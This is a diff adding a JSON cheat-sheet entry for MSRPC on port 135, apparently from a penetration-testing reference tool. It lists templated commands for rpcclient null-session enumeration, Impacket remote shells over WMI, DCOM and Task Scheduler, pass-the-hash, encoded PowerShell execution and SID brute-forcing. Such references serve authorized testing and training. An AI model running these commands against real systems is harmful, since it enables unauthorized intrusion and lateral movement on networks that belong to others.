@@ -1,0 +1,259 @@
+{
+  "port": 135,
+  "protocol": "tcp",
+  "service": "MSRPC",
+  "description": "Microsoft Remote Procedure Call — RPC endpoint enumeration, remote command execution via WMI/DCOM/Task Scheduler, and lateral movement.",
+  "tools": [
+    {
+      "name": "rpcclient",
+      "description": "Samba RPC client for interactive enumeration of domain users, groups, and policies via named pipes.",
+      "commands": [
+        {
+          "title": "Null session — connect anonymously",
+          "command": "rpcclient -U '' -N {{IP}}",
+          "description": "Connect with a null session (no credentials). Run enumeration commands interactively."
+        },
+        {
+          "title": "Authenticated session",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}}",
+          "description": "Connect with valid domain credentials."
+        },
+        {
+          "title": "Enumerate domain users",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'enumdomusers'",
+          "description": "List all domain users with their RIDs."
+        },
+        {
+          "title": "Enumerate domain groups",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'enumdomgroups'",
+          "description": "List all domain groups with their RIDs."
+        },
+        {
+          "title": "Query specific user by RID",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'queryuser {{RID}}'",
+          "description": "Get detailed info for a user by their RID (e.g., 500 for Administrator)."
+        },
+        {
+          "title": "Lookup username to SID",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'lookupnames {{TARGET_USER}}'",
+          "description": "Resolve a username to its SID."
+        },
+        {
+          "title": "Lookup SID to username",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'lookupsids {{SID}}'",
+          "description": "Resolve a SID to its username."
+        },
+        {
+          "title": "Display user info (querydispinfo)",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'querydispinfo'",
+          "description": "Display extended info for all users (name, description, flags)."
+        },
+        {
+          "title": "Enumerate group members",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'querygroupmem {{RID}}'",
+          "description": "List RIDs of all members in a group (e.g., 512 for Domain Admins)."
+        },
+        {
+          "title": "Get domain password policy",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'getdompwinfo'",
+          "description": "Retrieve the domain password policy (min length, complexity, etc.)."
+        },
+        {
+          "title": "Enumerate printers",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'enumprinters'",
+          "description": "Enumerate shared printers (useful for PrintNightmare / SpoolSample attacks)."
+        },
+        {
+          "title": "Enumerate privileges",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'enumprivs'",
+          "description": "List all available privileges on the target."
+        },
+        {
+          "title": "Get domain SID",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'lsaquery'",
+          "description": "Get the domain name and SID via LSA query."
+        },
+        {
+          "title": "Enumerate trusted domains",
+          "command": "rpcclient -U '{{DOMAIN}}/{{USERNAME}}%{{PASSWORD}}' {{IP}} -c 'lsaenumsid'",
+          "description": "Enumerate SIDs known to the LSA (reveals trust relationships)."
+        },
+        {
+          "title": "Null session — enumerate users",
+          "command": "rpcclient -U '' -N {{IP}} -c 'enumdomusers'",
+          "description": "Attempt to enumerate domain users with null session."
+        },
+        {
+          "title": "Null session — get password policy",
+          "command": "rpcclient -U '' -N {{IP}} -c 'getdompwinfo'",
+          "description": "Attempt to get password policy via null session."
+        }
+      ]
+    },
+    {
+      "name": "rpcdump.py (Impacket)",
+      "description": "Dump all registered RPC endpoints on the target to discover services and interfaces.",
+      "commands": [
+        {
+          "title": "Dump RPC endpoints (unauthenticated)",
+          "command": "rpcdump.py {{IP}}",
+          "description": "List all RPC endpoints without authentication."
+        },
+        {
+          "title": "Dump RPC endpoints (authenticated)",
+          "command": "rpcdump.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "List all RPC endpoints with valid credentials."
+        },
+        {
+          "title": "Dump endpoints on specific port",
+          "command": "rpcdump.py {{IP}} -port 135",
+          "description": "Dump RPC endpoints specifically from the endpoint mapper on port 135."
+        }
+      ]
+    },
+    {
+      "name": "wmiexec.py (Impacket)",
+      "description": "Semi-interactive shell over WMI (DCOM port 135). Does not drop a binary on disk. One of the stealthiest Impacket execution methods.",
+      "commands": [
+        {
+          "title": "Shell with password",
+          "command": "wmiexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a semi-interactive shell via WMI using password authentication."
+        },
+        {
+          "title": "Shell with NTLM hash (PtH)",
+          "command": "wmiexec.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}'",
+          "description": "Get a shell via WMI using pass-the-hash."
+        },
+        {
+          "title": "Execute single command",
+          "command": "wmiexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'whoami /all'",
+          "description": "Execute a single command via WMI without dropping into a shell."
+        },
+        {
+          "title": "Execute command with PtH",
+          "command": "wmiexec.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}' 'ipconfig /all'",
+          "description": "Execute a single command via WMI using pass-the-hash."
+        },
+        {
+          "title": "Shell with Kerberos auth",
+          "command": "wmiexec.py -k -no-pass '{{DOMAIN}}/{{USERNAME}}@{{TARGET_HOSTNAME}}'",
+          "description": "Get a shell via WMI using Kerberos authentication (requires valid ccache)."
+        },
+        {
+          "title": "Shell as local admin",
+          "command": "wmiexec.py './Administrator:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a shell using a local administrator account (note the './' prefix)."
+        },
+        {
+          "title": "Execute PowerShell command",
+          "command": "wmiexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'powershell -enc {{BASE64_CMD}}'",
+          "description": "Execute an encoded PowerShell command via WMI."
+        }
+      ]
+    },
+    {
+      "name": "dcomexec.py (Impacket)",
+      "description": "Semi-interactive shell via DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow). Does not create a service or drop binaries.",
+      "commands": [
+        {
+          "title": "Shell via MMC20 with password",
+          "command": "dcomexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a shell using the default MMC20.Application DCOM object."
+        },
+        {
+          "title": "Shell via MMC20 with PtH",
+          "command": "dcomexec.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}'",
+          "description": "Get a shell via MMC20.Application using pass-the-hash."
+        },
+        {
+          "title": "Shell via ShellWindows object",
+          "command": "dcomexec.py -object ShellWindows '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a shell using the ShellWindows DCOM object."
+        },
+        {
+          "title": "Shell via ShellBrowserWindow object",
+          "command": "dcomexec.py -object ShellBrowserWindow '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Get a shell using the ShellBrowserWindow DCOM object."
+        },
+        {
+          "title": "Execute single command via MMC20",
+          "command": "dcomexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'whoami'",
+          "description": "Execute a single command via DCOM without an interactive shell."
+        },
+        {
+          "title": "Shell via MMC20 with Kerberos",
+          "command": "dcomexec.py -k -no-pass '{{DOMAIN}}/{{USERNAME}}@{{TARGET_HOSTNAME}}'",
+          "description": "Get a shell via DCOM using Kerberos authentication."
+        },
+        {
+          "title": "Shell via ShellWindows with PtH",
+          "command": "dcomexec.py -object ShellWindows -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}'",
+          "description": "Get a shell via ShellWindows using pass-the-hash."
+        }
+      ]
+    },
+    {
+      "name": "atexec.py (Impacket)",
+      "description": "Execute commands via the Windows Task Scheduler service (ATSVC). Creates a scheduled task, runs the command, and retrieves output.",
+      "commands": [
+        {
+          "title": "Execute command with password",
+          "command": "atexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'whoami'",
+          "description": "Execute a command via Task Scheduler using password authentication."
+        },
+        {
+          "title": "Execute command with PtH",
+          "command": "atexec.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}' 'whoami'",
+          "description": "Execute a command via Task Scheduler using pass-the-hash."
+        },
+        {
+          "title": "Execute command with Kerberos",
+          "command": "atexec.py -k -no-pass '{{DOMAIN}}/{{USERNAME}}@{{TARGET_HOSTNAME}}' 'whoami'",
+          "description": "Execute a command via Task Scheduler using Kerberos authentication."
+        },
+        {
+          "title": "Dump system info",
+          "command": "atexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'systeminfo'",
+          "description": "Run systeminfo via scheduled task to enumerate OS details."
+        },
+        {
+          "title": "Read a file via Task Scheduler",
+          "command": "atexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'type C:\\Users\\Administrator\\Desktop\\flag.txt'",
+          "description": "Read a remote file by executing 'type' via scheduled task."
+        },
+        {
+          "title": "Execute PowerShell payload",
+          "command": "atexec.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' 'powershell -enc {{BASE64_CMD}}'",
+          "description": "Execute an encoded PowerShell command via Task Scheduler."
+        }
+      ]
+    },
+    {
+      "name": "lookupsid.py (Impacket)",
+      "description": "SID brute-forcing tool to enumerate domain users and groups via RPC.",
+      "commands": [
+        {
+          "title": "Brute-force SIDs with credentials",
+          "command": "lookupsid.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}'",
+          "description": "Enumerate users and groups by brute-forcing RIDs via LSA lookups."
+        },
+        {
+          "title": "Brute-force SIDs with null session",
+          "command": "lookupsid.py '{{DOMAIN}}/guest@{{IP}}' -no-pass",
+          "description": "Enumerate users and groups via guest or null session."
+        },
+        {
+          "title": "Brute-force SIDs with specific range",
+          "command": "lookupsid.py '{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{IP}}' -max-rid 10000",
+          "description": "Enumerate users and groups up to RID 10000."
+        },
+        {
+          "title": "Brute-force SIDs with PtH",
+          "command": "lookupsid.py -hashes ':{{HASH}}' '{{DOMAIN}}/{{USERNAME}}@{{IP}}'",
+          "description": "Enumerate users and groups using pass-the-hash."
+        }
+      ]
+    }
+  ]
+}
